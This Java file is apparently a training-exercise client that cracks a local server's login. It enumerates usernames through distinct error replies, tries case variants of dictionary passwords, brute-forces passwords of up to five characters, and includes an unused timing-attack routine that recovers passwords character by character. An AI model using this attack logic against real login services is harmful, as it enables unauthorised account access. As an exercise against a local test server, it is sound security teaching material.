package Task4;

import java.io.*;
import java.net.Socket;

import com.google.gson.Gson;

public class Client {
    public static final String DICTIONARY_PASSWORDS_FILE_PATH = "passwords.txt";
    public static final String DICTIONARY_LOGINS_FILE_PATH = "logins.txt";
    private static final char[] CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_@".toCharArray();


    private static final int MAX_LENGTH = 5;
    private static boolean isPasswordFound = false;

    public static void main(String[] args) {
        String serverAddress = "127.0.0.1";
        int serverPort = 34522;


        try (Socket socket = new Socket(serverAddress, serverPort);
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())
        ) {
            try {
                long startTime = System.currentTimeMillis();
                findCorrectLogin(input, output); // looking for correct login
                checkRainbowTable(input, output); // looking for correct password by checking rainbow table
                crackPasswordBruteForce(input, output); // looking for correct password by brute force

                System.out.println("The login is: " + AccessData.findLogin);
                System.out.println("The password is: " + AccessData.findPassword);
                long endTime = System.currentTimeMillis();

                System.out.println("Time: " + (endTime - startTime)/1000 + " s");

            } catch (IOException e) {
                System.out.println("Exception:" + e.getMessage() + " " + e.getClass().getSimpleName());
            }
        } catch (IOException e) {
            System.out.println("Connection to server exception:" + e.getMessage());
        }
    }

    private static void findCorrectLogin(DataInputStream input, DataOutputStream output) throws IOException {
        try (FileReader fileReader = new FileReader(DICTIONARY_LOGINS_FILE_PATH);
             BufferedReader reader = new BufferedReader(fileReader)
        ) {
            String dictionaryLogin;
            while ((dictionaryLogin = reader.readLine()) != null) {

                boolean isCorrectLoginFind = isLoginCorrect(dictionaryLogin, input, output);

                if (isCorrectLoginFind) {
                    break;
                }
            }
        }
    }

    private static boolean isLoginCorrect(String loginFromTable, DataInputStream input, DataOutputStream output) throws IOException {
        AccessData accessData = new AccessData(loginFromTable, "&");

        ServerAnswer response = sendingJsonAccessData(accessData, input, output);

        if (response.result.equals("Wrong password!")) {
            AccessData.findLogin = loginFromTable;
            return true;
        }
        return false;
    }

    private static void checkRainbowTable(DataInputStream input, DataOutputStream output) throws IOException {
        try (FileReader fileReader = new FileReader(DICTIONARY_PASSWORDS_FILE_PATH);
             BufferedReader reader = new BufferedReader(fileReader)
        ) {
            String dictionaryPassword;
            while ((dictionaryPassword = reader.readLine()) != null) {

                char[] dictionaryPasswordArray = dictionaryPassword.toLowerCase().toCharArray();

                int cycle = 0;

                checkAllCasesRecursive(dictionaryPasswordArray, cycle, input, output);
                if (isPasswordFound) {
                    break;
                }
            }
        }
    }

    private static void checkAllCasesRecursive(char[] passwordGuess, int cycle, DataInputStream input, DataOutputStream output) throws IOException {
        if (isPasswordFound) {
            return;
        }
        if (cycle == passwordGuess.length - 1) {
            isPasswordFound = isPasswordCorrect(passwordGuess, input, output);
            if (isPasswordFound) {
                AccessData.findPassword = new String(passwordGuess);
            } else {
                makeCharUpperCase(passwordGuess, cycle);
                isPasswordFound = isPasswordCorrect(passwordGuess, input, output);
                if (isPasswordFound) {
                    AccessData.findPassword = new String(passwordGuess);
                    return;
                }
                makeCharLowerCase(passwordGuess, cycle);
            }
        } else {
            checkAllCasesRecursive(passwordGuess, cycle + 1, input, output);

            makeCharUpperCase(passwordGuess, cycle);
            checkAllCasesRecursive(passwordGuess, cycle + 1, input, output);
            makeCharLowerCase(passwordGuess, cycle);
        }
    }

    private static boolean isPasswordCorrect(char[] arrayForWord, DataInputStream input, DataOutputStream output) throws IOException {
        String passwordString = new String(arrayForWord);
        AccessData accessData = new AccessData(AccessData.findLogin, passwordString);
        ServerAnswer serverAnswer = sendingJsonAccessData(accessData, input, output);

        if (serverAnswer.result.equals("Connection success!")) {
            AccessData.findPassword = passwordString;
            isPasswordFound = true;
            return true;
        }
        return false;
    }

    private static void makeCharUpperCase(char[] charArray, int charIndex) {
        char targetChar = charArray[charIndex];
        if (Character.isLetter(targetChar)) {
            charArray[charIndex] = (Character.toUpperCase(targetChar));
        }
    }

    private static void makeCharLowerCase(char[] charArray, int charIndex) {
        char targetChar = charArray[charIndex];
        if (Character.isLetter(targetChar)) {
            charArray[charIndex] = (Character.toLowerCase(targetChar));
        }
    }


    private static void crackPasswordBruteForce(DataInputStream input, DataOutputStream output) throws IOException {
        for (int length = 1; length <= MAX_LENGTH; length++) {
            crackPasswordRecursive("", length, input, output);
            if (isPasswordFound) {
                break;
            }
        }
    }

    private static void crackPasswordRecursive(String findPassword, int length, DataInputStream input, DataOutputStream output) throws IOException {
        if (findPassword.length() == length) {
            AccessData accessData = new AccessData(AccessData.findLogin, findPassword);
            ServerAnswer serverAnswer = sendingJsonAccessData(accessData, input, output);
            if (serverAnswer.result.equals("Connection success!")) {
                AccessData.findPassword = findPassword;
                isPasswordFound = true;
            }
        } else {
            for (char c : CHARACTERS) {
                crackPasswordRecursive(findPassword + c, length, input, output);
                if (isPasswordFound) {
                    break;
                }
            }
        }
    }

    private static ServerAnswer sendingJsonAccessData(AccessData LoginAndPassword, DataInputStream input, DataOutputStream output) throws IOException {
        Gson gson = new Gson();
        String jsonLoginAndPassword = gson.toJson(LoginAndPassword);
        output.writeUTF(jsonLoginAndPassword);

        String serverResponse = input.readUTF();
        return gson.fromJson(serverResponse, ServerAnswer.class);
    }

    static class ServerAnswer {
        public String result;
    }

    static class AccessData {
        public static String findLogin;
        public static String findPassword;

        String login;
        String password;

        public AccessData(String login, String password) {
            this.login = login;
            this.password = password;
        }
    }

    //////////////////////////////////////////////////////////////////////////////////
    private static void pickingPassword(DataInputStream input, DataOutputStream output) throws IOException {
        AccessData accessData = new AccessData(AccessData.findLogin, "");

        StringBuilder passwordKnownPart = new StringBuilder();

        boolean isPasswordFound = false;
        while (!isPasswordFound) {

            for (char character : CHARACTERS) {

                String passwordForCheck = passwordKnownPart.toString() + character;
                accessData.password = passwordForCheck;

                long startTime = System.currentTimeMillis();

                ServerAnswer response = sendingJsonAccessData(accessData, input, output);

                long endTime = System.currentTimeMillis();
                long currentResponseTime = endTime - startTime;

                if (response.result.equals("Connection success!")) {
                    AccessData.findPassword = passwordForCheck;
                    isPasswordFound = true;
                    break;
                } else if (currentResponseTime >= 2) {
                    passwordKnownPart.append(character);
                    break;
                }
            }
        }
    }
}